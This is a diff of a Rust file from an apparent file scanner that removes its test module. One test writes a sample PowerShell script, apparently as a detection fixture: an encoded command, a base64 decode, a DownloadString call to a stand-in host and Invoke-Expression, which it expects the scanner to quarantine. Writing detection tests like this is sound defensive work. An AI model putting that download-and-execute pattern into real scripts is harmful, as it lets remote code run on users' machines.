@@ -704,66 +704,6 @@ fn default_worker_count() -> usize {
         .unwrap_or(2)
 }
 
-#[allow(clippy::items_after_test_module)]
-#[cfg(test)]
-mod tests {
-    use std::time::{SystemTime, UNIX_EPOCH};
-
-    use crate::r#static::config::ScanConfig;
-
-    use super::scan_path;
-
-    fn unique_temp_path(prefix: &str) -> std::path::PathBuf {
-        let nanos = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .map(|duration| duration.as_nanos())
-            .unwrap_or(0);
-        std::env::temp_dir().join(format!("{prefix}_{nanos}.txt"))
-    }
-
-    #[test]
-    fn clean_files_are_restored_after_scan() {
-        let path = unique_temp_path("projectx_clean_scan");
-        std::fs::write(&path, "hello world").unwrap();
-
-        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();
-
-        assert!(outcome.is_safe());
-        assert!(path.exists());
-
-        let _ = std::fs::remove_file(path);
-    }
-
-    #[test]
-    fn suspicious_files_remain_quarantined() {
-        let path = std::env::temp_dir().join(format!(
-            "projectx_suspicious_scan_{}.ps1",
-            SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .map(|duration| duration.as_nanos())
-                .unwrap_or(0)
-        ));
-        std::fs::write(
-            &path,
-            r#"
-            powershell -EncodedCommand AAAA
-            [Convert]::FromBase64String("QUJDRA==")
-            (New-Object Net.WebClient).DownloadString("https://example.invalid")
-            Invoke-Expression $decoded
-            "#,
-        )
-        .unwrap();
-
-        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();
-
-        assert!(!outcome.is_safe());
-        assert!(!path.exists());
-        assert!(outcome.quarantine_path.exists());
-
-        let _ = std::fs::remove_file(outcome.quarantine_path);
-    }
-}
-
 fn scan_signal_sources(ctx: &ScanContext) -> Vec<String> {
     let mut sources = Vec::new();
     if ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false) {
